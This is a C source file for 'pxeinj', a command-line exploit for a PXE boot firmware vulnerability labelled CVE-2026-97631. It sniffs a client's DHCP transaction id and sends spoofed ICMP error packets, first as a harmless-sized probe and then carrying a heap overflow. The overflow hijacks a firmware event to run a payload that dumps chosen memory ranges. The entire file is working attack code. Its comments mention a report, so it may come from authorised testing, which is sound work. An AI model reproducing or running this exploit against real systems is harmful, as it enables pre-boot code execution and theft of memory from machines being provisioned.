/* main.c - transmitter.
 *
 *   1. sniff   grab the PXE client's live DHCP xid from the segment.  Without
 *              it the IP layer drops the ICMP error before the vulnerable
 *              handler runs.
 *   2. probe   send a 504-byte, well-formed ICMP error: exactly the buffer
 *              size, zero overflow.  Everything else identical.  If the client
 *              keeps booting, the spoof, the embedded datagram and the xid are
 *              all accepted and the copy loop is reached.  Stop there and you
 *              have a clean, non-destructive finding for the report.
 *   3. send    repeat with the overflow appended.
 *
 * The probe needs no pool address, so it is the first thing to run on an
 * unknown target.  The overflow needs --pool-base (see tools/fw_offsets.py).
 */

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <getopt.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>

#include "pxe_layout.h"
#include "craft.h"
#include "graft.h"
#include "layout.h"
#include "net.h"

static uint8_t g_payload[512 * 1024];
static size_t  g_payload_len;

static uint64_t parse_u64(const char *s) { return strtoull(s, NULL, 0); }

static void usage(void)
{
  fprintf(stderr,
"pxeinj - CVE-2026-97631 pre-boot memory reader\n"
"\n"
"  pxeinj --target <ip> --spoof <ip> --xid <hex> --probe\n"
"  pxeinj --target <ip> --spoof <ip> --xid <hex> --pool-base <hex> --send\n"
"\n"
"  --target <ip>       PXE client being provisioned\n"
"  --spoof <ip>        source address; the client's default gateway\n"
"  --iface <name>      egress interface (default eth0)\n"
"  --xid <hex>         BOOTP transaction id, or use --sniff\n"
"  --sniff             capture the xid passively first\n"
"  --pool-base <hex>   &Mode->IcmpError (tools/fw_offsets.py)\n"
"  --event-off <hex>   pool offset of the IEVENT (default 504)\n"
"  --payload <file>    payload.bin\n"
"  --ranges <file>     one START-END per line, hex without 0x\n"
"  --uart <hex>        MMIO UART base the payload writes to\n"
"  --out-buf <hex>     RAM sink address instead of serial\n"
"  --out-cap <hex>     RAM sink capacity\n"
"  --shadow <file>     pristine 0x48 bytes of the IEVENT, from a prior dump\n"
"  --probe             legal-path probe only\n"
"  --send              transmit (default is a dry run)\n"
"  --count <n>         retransmissions (default 3)\n");
}

static int load_ranges(const char *path, uint8_t *out, size_t cap, size_t *n)
{
  FILE *f = fopen(path, "r");
  char line[256];
  size_t cnt = 0;

  if (!f) { perror(path); return -1; }
  while (fgets(line, sizeof(line), f)) {
    unsigned long long s, e;
    char *p = line;
    while (*p == ' ' || *p == '\t') p++;
    if (*p == '#' || *p == '\n' || *p == 0) continue;
    if (sscanf(p, "%llx-%llx", &s, &e) != 2 &&
        sscanf(p, "%llu-%llu", &s, &e) != 2)
      continue;
    if ((cnt + 1) * 16 > cap) break;
    memcpy(out + cnt * 16, &s, 8);
    memcpy(out + cnt * 16 + 8, &e, 8);
    cnt++;
  }
  fclose(f);
  *n = cnt;
  return 0;
}

int main(int argc, char **argv)
{
  const char *target = NULL, *iface = "eth0", *spoof_str = NULL;
  const char *payload_path = NULL, *ranges_path = NULL, *shadow_path = NULL;
  uint32_t spoof = 0, xid = 0;
  uint64_t pool_base = 0, event_off = 504;
  uint64_t uart_base = 0, out_buf = 0, out_cap = 0;
  int do_sniff = 0, v6 = 0, probe_only = 0, do_send = 0, count = 3, k;
  static const struct option lo[] = {
    {"target", 1, 0, 't'}, {"spoof", 1, 0, 's'}, {"iface", 1, 0, 'i'},
    {"xid", 1, 0, 'x'},    {"sniff", 0, 0, 'n'}, {"pool-base", 1, 0, 'b'},
    {"event-off", 1, 0, 'e'}, {"payload", 1, 0, 'p'}, {"ranges", 1, 0, 'r'},
    {"uart", 1, 0, 'u'},   {"out-buf", 1, 0, 'B'}, {"out-cap", 1, 0, 'C'},
    {"shadow", 1, 0, 'H'}, {"v6", 0, 0, '6'},      {"probe", 0, 0, 'o'},
    {"send", 0, 0, 'S'},   {"count", 1, 0, 'c'},   {"help", 0, 0, 'h'},
    {0, 0, 0, 0}
  };
  int c;

  while ((c = getopt_long(argc, argv, "t:s:i:x:nb:e:p:r:u:B:C:H:6oSc:h",
                          lo, NULL)) != -1) {
    switch (c) {
    case 't': target = optarg; break;
    case 's': spoof_str = optarg; break;
    case 'i': iface = optarg; break;
    case 'x': xid = (uint32_t)strtoul(optarg, NULL, 16); break;
    case 'n': do_sniff = 1; break;
    case 'b': pool_base = parse_u64(optarg); break;
    case 'e': event_off = parse_u64(optarg); break;
    case 'p': payload_path = optarg; break;
    case 'r': ranges_path = optarg; break;
    case 'u': uart_base = parse_u64(optarg); break;
    case 'B': out_buf = parse_u64(optarg); break;
    case 'C': out_cap = parse_u64(optarg); break;
    case 'H': shadow_path = optarg; break;
    case '6': v6 = 1; break;
    case 'o': probe_only = 1; break;
    case 'S': do_send = 1; break;
    case 'c': count = atoi(optarg); break;
    case 'h': usage(); return 0;
    default:  usage(); return 2;
    }
  }
  if (!target) { usage(); return 2; }

  if (do_sniff && !xid) {
    uint32_t client = 0;
    if (net_sniff_xid(iface, &xid, &client) == 0)
      printf("[*] xid %08x, client %08x\n", xid, client);
    else {
      fprintf(stderr, "[!] no DHCP seen on %s; pass --xid\n", iface);
      return 1;
    }
  }
  if (!xid)      { fprintf(stderr, "[!] need --xid (or --sniff)\n"); return 2; }
  if (!spoof_str){ fprintf(stderr, "[!] need --spoof\n"); return 2; }
  if (!v6)       spoof = inet_addr(spoof_str);
  if (!v6 && spoof == INADDR_NONE) {
    fprintf(stderr, "[!] --spoof is not an IPv4 address\n"); return 2;
  }
  if (!probe_only && !pool_base) {
    fprintf(stderr, "[!] need --pool-base for the overflow; "
                    "run --probe first\n");
    return 2;
  }
  if (v6 && !probe_only) {
    fprintf(stderr, "[!] the v6 overflow path is untested; "
                    "the v6 copy bound has not been re-derived\n");
    return 2;
  }

  if (payload_path) {
    FILE *f = fopen(payload_path, "rb");
    if (!f) { perror(payload_path); return 1; }
    g_payload_len = fread(g_payload, 1, sizeof(g_payload), f);
    fclose(f);
    printf("[*] payload %zu bytes\n", g_payload_len);
  } else if (!probe_only) {
    /* Without a payload the event would point at the range table and the
     * firmware would jump into data. Fail loudly instead. */
    fprintf(stderr, "[!] --payload build/payload.bin is required\n");
    return 2;
  }

  static uint8_t ranges[8192];
  size_t range_n = 0;
  if (ranges_path) {
    if (load_ranges(ranges_path, ranges, sizeof(ranges), &range_n) < 0)
      return 1;
    printf("[*] %zu range(s)\n", range_n);
  }

  /* The pristine IEVENT, needed so the payload can put the object back.  If it
   * is not supplied the restore writes 0x48 zeroes, which leaves a corrupt
   * event in the core's list: a later signal would walk into it. Refuse. */
  static uint8_t shadow[GRAFT_EVENT_LEN];
  if (shadow_path) {
    FILE *f = fopen(shadow_path, "rb");
    if (!f) { perror(shadow_path); return 1; }
    if (fread(shadow, 1, sizeof(shadow), f) != sizeof(shadow)) {
      fprintf(stderr, "[!] %s: short read, expected %u bytes\n",
              shadow_path, GRAFT_EVENT_LEN);
      fclose(f);
      return 2;
    }
    fclose(f);

    /* A zero-filled file of the right length would pass the size check and
     * reintroduce exactly the corruption the snapshot exists to avoid. The
     * signature also proves the offset pointed at a real event. */
    uint32_t sig;
    memcpy(&sig, shadow + EVT_OFF_SIGNATURE, 4);
    if (sig != EVENT_SIGNATURE) {
      fprintf(stderr, "[!] %s: no EFI_EVENT signature at that address "
                      "(got %08x, want %08x)\n", shadow_path, sig,
              EVENT_SIGNATURE);
      fprintf(stderr, "    either the file is not a pool dump, or "
                      "--event-off is wrong\n");
      return 2;
    }
  } else if (!probe_only) {
    fprintf(stderr, "[!] --shadow needs the 0x48 bytes at the event address,\n"
                    "    captured before the overflow.  Without it the event is\n"
                    "    restored to zeroes and the core's list is left corrupt.\n");
    return 2;
  }

  if (!probe_only && range_n == 0) {
    fprintf(stderr, "[!] --ranges is empty; nothing to read\n");
    return 2;
  }

  static uint8_t overflow[256 * 1024];
  size_t overflow_len = 0;
  layout_out_t lay;
  memset(&lay, 0, sizeof(lay));

  if (!probe_only) {
    layout_cfg_t cfg;
    memset(&cfg, 0, sizeof(cfg));
    cfg.pool_base = pool_base;
    cfg.event_off = event_off;
    cfg.uart      = uart_base;
    cfg.out_buf   = out_buf;
    cfg.out_cap   = out_cap;

    int n = layout_build(overflow, sizeof(overflow), &cfg,
                         g_payload, g_payload_len,
                         ranges, range_n, shadow, &lay);
    if (n < 0) { fprintf(stderr, "[!] overflow layout too large\n"); return 1; }
    overflow_len = (size_t)n;

    printf("[*] layout event %016llx payload %016llx ranges %016llx\n",
           (unsigned long long)lay.event_addr,
           (unsigned long long)lay.payload_addr,
           (unsigned long long)lay.ranges_addr);
  }

  craft_req_t rq;
  memset(&rq, 0, sizeof(rq));
  rq.src = spoof;
  rq.icmp_type = 3;
  rq.icmp_code = 3;                       /* port unreachable */

  if (v6) {
    if (inet_pton(AF_INET6, target, rq.dst6) != 1) {
      fprintf(stderr, "[!] --target is not an IPv6 address\n");
      return 2;
    }
    if (inet_pton(AF_INET6, spoof_str, rq.src6) != 1) {
      fprintf(stderr, "[!] --spoof is not an IPv6 address\n");
      return 2;
    }
    rq.icmp_type = 3;                     /* time exceeded */
    rq.icmp_code = 0;
  } else {
    rq.dst = inet_addr(target);
    if (rq.dst == INADDR_NONE) {
      fprintf(stderr, "[!] --target is not an IPv4 address\n");
      return 2;
    }
  }

  rq.embed_src = rq.dst;
  rq.embed_dst = pxe_htonl(0xffffffffu);  /* as during DISCOVER */
  rq.embed_sport = 68;
  rq.embed_dport = 67;

  rq.embed_data[0] = 1;                   /* BOOTREQUEST */
  rq.embed_data[1] = 1;                   /* htype: ethernet */
  rq.embed_data[2] = 6;                   /* hlen */
  rq.embed_data[3] = 0;
  rq.embed_data[4] = (uint8_t)(xid >> 24);
  rq.embed_data[5] = (uint8_t)(xid >> 16);
  rq.embed_data[6] = (uint8_t)(xid >> 8);
  rq.embed_data[7] = (uint8_t)xid;

  if (probe_only) {
    rq.off = PXE_ICMP_ERROR_SIZE;
    rq.overflow = (const uint8_t *)"";
    rq.overflow_len = 0;
  } else {
    rq.off = (size_t)event_off;
    rq.overflow = overflow;
    rq.overflow_len = overflow_len;
  }

  static uint8_t pkt[512 * 1024];
  size_t plen = v6 ? craft_ipv6_packet(pkt, sizeof(pkt), &rq)
                   : craft_icmp4(pkt, sizeof(pkt), &rq);
  if (!plen) { fprintf(stderr, "[!] packet build failed\n"); return 1; }

  printf("[*] %s: %zu byte datagram, overflow at +0x%llx, %zu bytes\n",
         probe_only ? "probe" : "overflow", plen,
         (unsigned long long)rq.off,
         probe_only ? (size_t)0 : overflow_len);

  if (!do_send) {
    printf("[*] dry run.  --send to transmit.\n");
    return 0;
  }

  int fd = socket(v6 ? AF_INET6 : AF_INET, SOCK_RAW, IPPROTO_RAW);
  if (fd < 0) { perror("socket"); return 1; }

  for (k = 0; k < count; k++) {
    int rc;
    if (v6) {
      uint8_t d6[16];
      memcpy(d6, rq.dst6, 16);
      rc = net_send_l3_v6(fd, iface, pkt, plen, d6);
    } else {
      rc = net_send_l3(fd, iface, pkt, plen, rq.dst);
    }
    if (rc < 0) { close(fd); return 1; }
    usleep(120000);
  }
  close(fd);
  printf("[*] sent %d\n", count);
  return 0;
}
